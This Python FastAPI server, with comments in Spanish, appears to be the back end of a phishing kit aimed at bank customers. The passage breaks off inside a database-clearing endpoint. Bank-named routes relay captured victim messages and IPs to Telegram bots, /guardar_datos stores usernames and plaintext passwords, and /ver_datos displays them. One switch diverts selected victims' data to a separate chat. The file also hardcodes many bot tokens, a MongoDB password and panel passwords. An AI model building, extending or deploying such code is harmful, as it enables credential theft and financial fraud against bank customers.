from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
from fastapi import File, Form
from functools import partial, lru_cache
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
from fastapi.responses import HTMLResponse
from collections import deque, defaultdict
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime, timedelta
import re
import asyncio
import time
from contextlib import asynccontextmanager
import logging
from asyncio import Semaphore, Queue
import weakref
import ipaddress

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =====================
#  Config y Caches
# =====================

# (Eliminado CACHE_TTL e ip_cache por quitar geolocalización)
blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
user_cache: Dict[str, int] = {}      # Cache para números de usuario
ip_number_cache: Dict[str, int] = {} # Cache para números de IP

# Configuraciones de concurrencia
MAX_CONCURRENT_REQUESTS = 100  # Máximo de solicitudes concurrentes
MAX_DB_CONNECTIONS = 20        # Máximo de conexiones a BD concurrentes
MAX_HTTP_CONNECTIONS = 50      # Máximo de conexiones HTTP concurrentes
REQUEST_TIMEOUT = 30           # Timeout para requests en segundos

# Configuraciones optimizadas para Telegram
MAX_TELEGRAM_CONCURRENT = 20   # Máximo 20 mensajes simultáneos
MAX_TELEGRAM_QUEUE_SIZE = 1000 # Cola grande para picos de tráfico
TELEGRAM_TIMEOUT = 10.0        # Timeout por mensaje
TELEGRAM_RETRY_DELAY = 0.5     # Delay entre reintentos
MAX_TELEGRAM_RETRIES = 2       # Máximo reintentos por mensaje

# Rate limiting por bot (para evitar límites de Telegram API)
RATE_LIMIT_MESSAGES_PER_MINUTE = 30  # Por bot
RATE_LIMIT_MESSAGES_PER_SECOND = 1   # Por bot

# Semáforos para controlar concurrencia
request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(MAX_TELEGRAM_CONCURRENT)

# Colas para procesar tareas
background_queue: Queue = Queue(maxsize=1000)
telegram_queue: Queue = Queue(maxsize=MAX_TELEGRAM_QUEUE_SIZE)

# Rate limiting por bot y estadísticas
bot_rate_limits = defaultdict(lambda: {"messages": [], "last_second": 0})
telegram_stats = {
    "sent_immediate": 0,
    "sent_queued": 0,
    "failed": 0,
    "queue_full": 0,
    "rate_limited": 0,
    "total_processed": 0
}

# Configuraciones originales (provistas por el usuario)
TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"
numeros_r = frozenset({4, 6, 9})
iprandom = frozenset({4, 6, 9})

# =====================
#  Utilidades de IP (sin geolocalización)
# =====================

def is_valid_ip(ip: str) -> bool:
    """
    Valida si una cadena es una IP válida (IPv4 o IPv6)
    Excluye IPs privadas/locales que pueden aparecer en proxies
    """
    try:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
            return False
        if isinstance(ip_obj, ipaddress.IPv4Address):
            if ip == "0.0.0.0" or ip.startswith("192.0.2.") or ip.startswith("198.51.100.") or ip.startswith("203.0.113."):
                return False
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False

def obtener_ip_real(request: Request) -> str:
    """
    Obtiene la IP real del cliente considerando headers comunes de proxies.
    (Sin geolocalización, solo detección de IP)
    """
    vercel_headers = [
        "x-vercel-forwarded-for",
        "x-forwarded-for",
        "x-real-ip",
    ]
    additional_headers = [
        "cf-connecting-ip",
        "x-client-ip",
        "x-forwarded",
        "forwarded-for",
        "forwarded",
        "x-cluster-client-ip",
        "x-original-forwarded-for",
    ]
    all_headers = vercel_headers + additional_headers

    for header in all_headers:
        value = request.headers.get(header)
        if value:
            ips = [ip.strip() for ip in value.split(",")]
            for ip in ips:
                if ip and is_valid_ip(ip):
                    logger.info(f"IP obtenida de header '{header}': {ip}")
                    return ip

    client_ip = getattr(request.client, 'host', None) if request.client else None
    if client_ip and is_valid_ip(client_ip):
        logger.info(f"IP obtenida del cliente directo: {client_ip}")
        return client_ip

    fallback_ip = "127.0.0.1"
    logger.warning(f"No se pudo obtener IP real, usando fallback: {fallback_ip}")
    return fallback_ip

def debug_headers(request: Request) -> dict:
    """Devuelve headers útiles para debug de IP (sin geo)."""
    debug_info = {
        "all_headers": dict(request.headers),
        "client_info": {
            "host": getattr(request.client, 'host', None) if request.client else None,
            "port": getattr(request.client, 'port', None) if request.client else None,
        },
        "url_info": {
            "host": request.url.hostname,
            "port": request.url.port,
            "scheme": request.url.scheme,
        }
    }
    ip_headers = [
        "x-vercel-forwarded-for",
        "x-forwarded-for",
        "x-real-ip",
        "cf-connecting-ip",
        "x-client-ip"
    ]
    debug_info["ip_headers"] = {}
    for header in ip_headers:
        value = request.headers.get(header)
        if value:
            debug_info["ip_headers"][header] = value
    return debug_info

# =====================
#  Telegram
# =====================

class TelegramMessage:
    def __init__(self, mensaje: str, chat_id: str, token: str, priority: int = 1, max_retries: int = MAX_TELEGRAM_RETRIES):
        self.mensaje = mensaje
        self.chat_id = chat_id
        self.token = token
        self.priority = priority
        self.max_retries = max_retries
        self.attempts = 0
        self.created_at = time.time()

def check_rate_limit(token: str) -> bool:
    current_time = time.time()
    current_second = int(current_time)
    rate_info = bot_rate_limits[token]
    rate_info["messages"] = [timestamp for timestamp in rate_info["messages"] if timestamp > current_time - 60]
    if len(rate_info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
        return False
    if rate_info["last_second"] == current_second:
        return False
    return True

def record_message_sent(token: str):
    current_time = time.time()
    rate_info = bot_rate_limits[token]
    rate_info["messages"].append(current_time)
    rate_info["last_second"] = int(current_time)

async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
    async with telegram_semaphore:
        for intento in range(mensaje_obj.max_retries + 1):
            try:
                if not check_rate_limit(mensaje_obj.token):
                    if intento == 0:
                        telegram_stats["rate_limited"] += 1
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

                url = f"https://api.telegram.org/bot{mensaje_obj.token}/sendMessage"
                payload = {"chat_id": mensaje_obj.chat_id, "text": mensaje_obj.mensaje[:4000]}
                response = await asyncio.wait_for(
                    app.state.http_client.post(url, json=payload),
                    timeout=TELEGRAM_TIMEOUT
                )

                if response.status_code == 200:
                    record_message_sent(mensaje_obj.token)
                    return True
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 1))
                    await asyncio.sleep(min(retry_after, 10))
                    continue
                else:
                    logger.warning(f"Error Telegram HTTP {response.status_code}")
                    if intento < mensaje_obj.max_retries:
                        await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                        continue
            except asyncio.TimeoutError:
                logger.warning(f"Timeout enviando mensaje Telegram (intento {intento + 1})")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
            except Exception as e:
                logger.error(f"Error enviando Telegram (intento {intento + 1}): {e}")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
        return False

async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            try:
                if asyncio.iscoroutinefunction(func):
                    await func(*args, **kwargs)
                else:
                    func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error en background worker: {e}")
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Error en background worker loop: {e}")
            await asyncio.sleep(1)

async def telegram_worker(worker_id: int):
    logger.info(f"Telegram worker {worker_id} iniciado")
    while True:
        try:
            mensaje_obj = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
            if mensaje_obj is None:
                logger.info(f"Telegram worker {worker_id} recibió señal de parada")
                break
            start_time = time.time()
            success = await _enviar_telegram_optimizado(mensaje_obj)
            processing_time = time.time() - start_time
            if success:
                telegram_stats["sent_queued"] += 1
                telegram_stats["total_processed"] += 1
                logger.debug(f"Worker {worker_id}: Mensaje enviado en {processing_time:.2f}s")
            else:
                telegram_stats["failed"] += 1
                logger.error(f"Worker {worker_id}: Falló después de reintentos")
            telegram_queue.task_done()
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            logger.error(f"Error en telegram worker {worker_id}: {e}")
            await asyncio.sleep(1)

async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN,
                                  priority: int = 1, force_immediate: bool = False) -> dict:
    mensaje_obj = TelegramMessage(mensaje, chat_id, token, priority)
    if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
        if check_rate_limit(token):
            try:
                success = await asyncio.wait_for(
                    _enviar_telegram_optimizado(mensaje_obj),
                    timeout=TELEGRAM_TIMEOUT + 2.0
                )
                if success:
                    telegram_stats["sent_immediate"] += 1
                    telegram_stats["total_processed"] += 1
                    return {"status": "sent_immediate", "success": True, "method": "direct"}
            except asyncio.TimeoutError:
                logger.warning("Timeout en envío inmediato, pasando a cola")
            except Exception as e:
                logger.error(f"Error en envío inmediato: {e}")
    try:
        telegram_queue.put_nowait(mensaje_obj)
        return {"status": "queued", "success": True, "method": "queue", "queue_size": telegram_queue.qsize()}
    except asyncio.QueueFull:
        telegram_stats["queue_full"] += 1
        logger.error("Cola de Telegram llena, mensaje descartado")
        return {"status": "queue_full", "success": False, "method": "none"}

# =====================
#  Lifespan
# =====================

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2,
            keepalive_expiry=30.0
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )
    await init_db_async()
    await load_caches()
    app.state.background_task = asyncio.create_task(background_worker())
    app.state.telegram_workers = []
    for i in range(5):
        worker = asyncio.create_task(telegram_worker(i))
        app.state.telegram_workers.append(worker)
    logger.info("Aplicación iniciada con 5 workers de Telegram optimizados")
    yield
    logger.info("Cerrando aplicación...")
    await background_queue.put(None)
    for _ in range(len(app.state.telegram_workers)):
        await telegram_queue.put(None)
    try:
        await asyncio.wait_for(app.state.background_task, timeout=10.0)
        await asyncio.gather(*app.state.telegram_workers, timeout=10.0)
    except asyncio.TimeoutError:
        logger.warning("Workers no terminaron en tiempo esperado")
    await app.state.http_client.aclose()

app = FastAPI(lifespan=lifespan)

# =====================
#  CORS
# =====================

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600,
)

# =====================
#  MongoDB
# =====================

client = AsyncIOMotorClient(
    "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd",
    maxPoolSize=MAX_DB_CONNECTIONS,
    minPoolSize=5,
    maxIdleTimeMS=30000,
    serverSelectionTimeoutMS=5000,
    socketTimeoutMS=5000,
    connectTimeoutMS=5000,
    waitQueueTimeoutMS=5000,
    maxConnecting=10
)
db = client["api_db"]
ip_numbers = db["ip_numbers"]
user_numbers = db["user_numbers"]
global_settings = db["global_settings"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]

# =====================
#  Estado global
# =====================

cola = deque(maxlen=100)
baneado = deque(maxlen=200)
variable = False
is_active_cache = False
cache_last_updated = 0

async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        logger.warning("Queue de background lleno, descartando tarea")

# =====================
#  Inicialización BD / Caches (sin geo)
# =====================

async def init_db_async():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(global_settings.create_index("id", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            if not await global_settings.find_one({"id": 1}):
                await global_settings.insert_one({"id": 1, "is_active": False})
            logger.info("Base de datos inicializada correctamente")
        except Exception as e:
            logger.error(f"Error inicializando BD: {e}")

async def load_caches():
    global blocked_ips_cache, is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
            settings = await global_settings.find_one({"id": 1})
            is_active_cache = settings.get("is_active", False) if settings else False
            ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000)
            async for doc in ip_docs:
                ip_number_cache[doc["ip"]] = doc["number"]
            user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(2000)
            async for doc in user_docs:
                user_cache[doc["username"]] = doc["number"]
            cache_last_updated = time.time()
            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")

# =====================
#  Helpers BD / Cache
# =====================

@lru_cache(maxsize=2000)
def validar_contrasena_cached(contrasena: str) -> bool:
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

def agregar_elemento_diccionario_cache(ip: str, numero: int):
    if len(ip_number_cache) > 10000:
        keys_to_remove = list(ip_number_cache.keys())[:1000]
        for key in keys_to_remove:
            ip_number_cache.pop(key, None)
    ip_number_cache[ip] = numero

async def agregar_elemento_diccionario_async(ip: str, numero: int):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_numbers.insert_one({"ip": ip, "number": numero}), timeout=5.0)
            agregar_elemento_diccionario_cache(ip, numero)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error guardando IP en BD: {e}")

def obtener_numero_cached(ip: str) -> Optional[int]:
    return ip_number_cache.get(ip)

def obtener_usuario_cached(usuario: str) -> Optional[int]:
    return user_cache.get(usuario)

async def refresh_is_active_cache():
    global is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=3.0)
            is_active_cache = bool(doc["is_active"]) if doc else False
            cache_last_updated = time.time()
        except asyncio.TimeoutError:
            logger.warning("Timeout actualizando cache is_active")
        except Exception as e:
            logger.error(f"Error actualizando cache is_active: {e}")

def obtener_is_active_cached() -> bool:
    global cache_last_updated, is_active_cache
    current_time = time.time()
    if current_time - cache_last_updated > 60:
        asyncio.create_task(refresh_is_active_cache())
    return is_active_cache

def contar_elemento_optimized(cola: deque, elemento: str) -> int:
    return sum(1 for x in cola if x == elemento)

# =====================
#  Middlewares
# =====================

class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    return await call_next(request)
        except asyncio.TimeoutError:
            logger.warning(f"Request timeout para {request.url.path}")
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado, intenta más tarde"})
        except Exception as e:
            logger.error(f"Error en ConcurrencyLimitMiddleware: {e}")
            return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})

class FastBasicAuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, username: str, password: str):
        super().__init__(app)
        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()

    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith(("/docs", "/redoc")):
            auth = request.headers.get("Authorization")
            if not auth or not auth.endswith(self.auth_string):
                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
        return await call_next(request)

class VercelOptimizedIPBlockMiddleware(BaseHTTPMiddleware):
    """Bloqueo por IP (lista) SIN geolocalización."""
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = obtener_ip_real(request)
        logger.info(f"Cliente IP detectada: {client_ip} para path: {request.url.path}")

        if client_ip in blocked_ips_cache:
            logger.warning(f"IP bloqueada en cache: {client_ip}")
            return JSONResponse(status_code=403, content={"detail": "Acceso denegado, la IP está bloqueada", "ip": client_ip})

        # Asignar número si no existe y es una IP válida
        if (client_ip not in iprandom and client_ip not in ip_number_cache and is_valid_ip(client_ip) and client_ip != "127.0.0.1"):
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario_cache(client_ip, numero_random)
            await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)

        return await call_next(request)

app.add_middleware(ConcurrencyLimitMiddleware)
app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
app.add_middleware(VercelOptimizedIPBlockMiddleware)

# =====================
#  Modelos
# =====================

class ClaveRequest(BaseModel):
    clave: str

class UpdateNumberRequest(BaseModel):
    numero: int

class IPRequest(BaseModel):
    ip: str

class DynamicMessage(BaseModel):
    mensaje: str

# =====================
#  Endpoints
# =====================

@app.get("/login", response_class=HTMLResponse)
async def login_form():
    return """
    <html>
    <head><title>Acceso</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
        <h2>Ingrese la contraseña para acceder</h2>
        <form method="post" action="/login">
            <input type="password" name="password" placeholder="Contraseña" />
            <button type="submit">Ingresar</button>
        </form>
    </body>
    </html>
    """

@app.post("/login")
async def login(password: str = Form(...)):
    if password == "gato123":
        try:
            with open("static/panel.html", "r", encoding="utf-8") as f:
                content = f.read()
            return HTMLResponse(content=content)
        except:
            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
    else:
        return HTMLResponse("<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", status_code=401)

@app.post("/validar_clave")
async def validar_clave(data: ClaveRequest):
    return {"valido": data.clave == "gato123"}

@app.get("/debug_ip")
async def debug_ip_endpoint(request: Request):
    debug_info = debug_headers(request)
    detected_ip = obtener_ip_real(request)
    return {
        "detected_ip": detected_ip,
        "is_valid_ip": is_valid_ip(detected_ip) if detected_ip else False,
        "geo_info": {"enabled": False},
        "debug_headers": debug_info,
        "platform": "vercel" if "vercel" in request.headers.get("host", "").lower() else "other",
        "timestamp": datetime.utcnow().isoformat()
    }

async def _bloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()}), timeout=5.0)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout bloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error bloqueando IP en BD: {e}")

@app.post("/bloquear_ip/")
async def bloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    if ip not in blocked_ips_cache:
        blocked_ips_cache.add(ip)
        await add_background_task(_bloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido bloqueada."}
    else:
        return {"message": f"La IP {ip} ya estaba bloqueada."}

async def _desbloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_bloqueadas.delete_one({"ip": ip}), timeout=5.0)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout desbloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error desbloqueando IP en BD: {e}")

@app.post("/desbloquear_ip/")
async def desbloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    if ip in blocked_ips_cache:
        blocked_ips_cache.discard(ip)
        await add_background_task(_desbloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido desbloqueada."}
    else:
        return {"message": f"La IP {ip} no estaba bloqueada."}

@app.get("/ips_bloqueadas/")
async def obtener_ips_bloqueadas():
    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}

@app.get("/")
async def read_root():
    return {"message": "API funcionando correctamente!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                logs_usuarios.insert_one({
                    "usuario": usuario,
                    "contrasena": contra,
                    "ip": ip,
                    "pais": pais,
                    "fecha": datetime.utcnow()
                }),
                timeout=5.0
            )
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando log usuario {usuario}")
        except Exception as e:
            logger.error(f"Error guardando log usuario: {e}")

@app.post("/guardar_datos")
async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), request: Request = None):
    ip = obtener_ip_real(request)
    # Sin geolocalización
    pais = "N/A"
    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
    return {"message": "Datos guardados correctamente", "ip": ip, "pais": pais}

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    async with db_semaphore:
        try:
            registros = []
            cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
            async for registro in cursor:
                registros.append(registro)
            html = """
            <html>
            <head><title>Registros de Usuarios</title></head>
            <body>
                <h2>Listado de registros (últimos 100)</h2>
                <table border="1">
                    <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
            """
            for registro in registros:
                usuario = registro.get("usuario", "")
                contrasena = registro.get("contrasena", "")
                ip_reg = registro.get("ip", "")
                pais = registro.get("pais", "")
                fecha = registro.get("fecha", "")
                html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip_reg}</td><td>{pais}</td><td>{fecha}</td></tr>"
            html += "</table></body></html>"
            return HTMLResponse(content=html)
        except Exception as e:
            logger.error(f"Error obteniendo datos: {e}")
            return HTMLResponse("<h3>Error obteniendo datos</h3>", status_code=500)

@app.get("/usuarios/")
async def obtener_usuarios():
    if not user_cache:
        return {"message": "No se encontraron usuarios en caché."}
    usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
    return {"usuarios": usuarios}

@app.get("/is_active/")
async def obtener_estado_actual():
    estado = obtener_is_active_cached()
    return {"is_active": estado}

@app.post("/toggle/")
async def alternar_estado():
    global is_active_cache
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=5.0)
            if doc:
                nuevo_valor = not doc["is_active"]
                await asyncio.wait_for(global_settings.update_one({"id": 1}, {"$set": {"is_active": nuevo_valor}}), timeout=5.0)
                is_active_cache = nuevo_valor
                return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
            else:
                raise ValueError("No se encontró la configuración global.")
        except asyncio.TimeoutError:
            return {"error": "Timeout actualizando estado"}
        except ValueError as e:
            return {"error": str(e)}
        except Exception as e:
            logger.error(f"Error alternando estado: {e}")
            return {"error": "Error interno del servidor"}

@app.get("/ips/")
async def obtener_ips():
    if not ip_number_cache:
        return {"message": "No se encontraron IPs en caché."}
    ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
    return {"ips": ips}

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: IPRequest):
    ip = data.ip.strip()
    cola.append(ip)
    repeticiones = contar_elemento_optimized(cola, ip)
    if repeticiones > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {"ip": ip, "repeticiones": repeticiones, "spam": True, "mensaje": "IP detectada como spam y bloqueada"}
    else:
        return {"ip": ip, "repeticiones": repeticiones, "spam": False, "mensaje": "IP aún no considerada spam"}

# =====================
#  Endpoint dinámico (sin geo)
# =====================

async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
    client_ip = obtener_ip_real(request)
    cola.append(client_ip)
    numeror = obtener_numero_cached(client_ip)

    if contar_elemento_optimized(cola, client_ip) > 8:
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    mensaje = request_data.mensaje
    path = config["path"]

    # Sin geolocalización
    pais = "N/A"

    mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"

    telegram_results = []
    try:
        # Quitar lógica dependiente de país
        if (path.startswith("/bdv") and obtener_is_active_cached() and numeror in numeros_r):
            result = await enviar_telegram_hibrido(
                mensaje_completo + " Todo tuyo",
                "-4931572577",
                TOKEN,
                priority=2,
                force_immediate=True
            )
            telegram_results.append(result)
        elif path.startswith("/maikelhot"):
            result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
            telegram_results.append(result1)
            result2 = await enviar_telegram_hibrido(mensaje_completo, config["chat_id"], config["bot_id"], priority=1)
            telegram_results.append(result2)
        else:
            result1 = await enviar_telegram_hibrido(mensaje_completo, "-4826186479", TOKEN, priority=1)
            telegram_results.append(result1)
            result2 = await enviar_telegram_hibrido(mensaje, config["chat_id"], config["bot_id"], priority=1)
            telegram_results.append(result2)

        successful_sends = sum(1 for r in telegram_results if r["success"])
        return {
            "mensaje_enviado": successful_sends > 0,
            "pais_origen": pais,
            "ip": client_ip,
            "telegram_results": telegram_results,
            "successful_sends": successful_sends,
            "total_attempts": len(telegram_results)
        }
    except Exception as e:
        logger.error(f"Error en sistema Telegram: {e}")
        return {
            "mensaje_enviado": False,
            "pais_origen": pais,
            "ip": client_ip,
            "telegram_error": str(e),
            "telegram_results": telegram_results
        }

# =====================
#  Registro de endpoints dinámicos
# =====================

endpoint_configs = [
    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/bdv7/", "chat_id": "7398992131", "bot_id": "7000144654:AAECBupVvE_1FSNoPpAAp9kNFSRLOVYC_5E"},
    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
    {"path": "/lafise/", "chat_id": "7098816483", "bot_id": "8214397313:AAEkkZm2J3MwVpYRHZ3HkeA2B55owXJo5UE"},
    {"path": "/pmcrcs/", "chat_id": "-4880252609", "bot_id": "8310478240:AAH1SK4hbe9YdNvLMILauxSfqg3WbwnMWq0"},
    {"path": "/promerigt/", "chat_id": "7098816483", "bot_id": "7539298674:AAHDo4h_05ZWr2YaNPnPFq02oTjAfl4vNEQ"},
    {"path": "/htmiao/", "chat_id": "908735123", "bot_id": "5935593600:AAFeONdWGRxbPXOJsOUr1QPgJcUUBilc3q0"},
]

from copy import deepcopy
for config in endpoint_configs:
    app.add_api_route(path=config["path"], endpoint=partial(handle_dynamic_endpoint_optimized, config), methods=["POST"])
    if config["path"].endswith("/"):
        config_sin_barra = deepcopy(config)
        config_sin_barra["path"] = config["path"].rstrip("/")
        app.add_api_route(path=config_sin_barra["path"], endpoint=partial(handle_dynamic_endpoint_optimized, config_sin_barra), methods=["POST"])

# =====================
#  Utilidades de mantenimiento
# =====================

async def _clear_db_collections():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_numbers.delete_many({}), timeout=30.0),
                asyncio.wait_for(user_numbers.delete_many({}), timeout=30.0)
            ]
            await asyncio.gather(*tasks)
            return True
        except asyncio.TimeoutError:
            logger.error("Timeout limpiando BD")
            return False
        except Exception as e:
            logger.error(f"Error limpiando BD: {e}")
            return False

@app.post('/clear_db')
async def clear_db_endpoint():
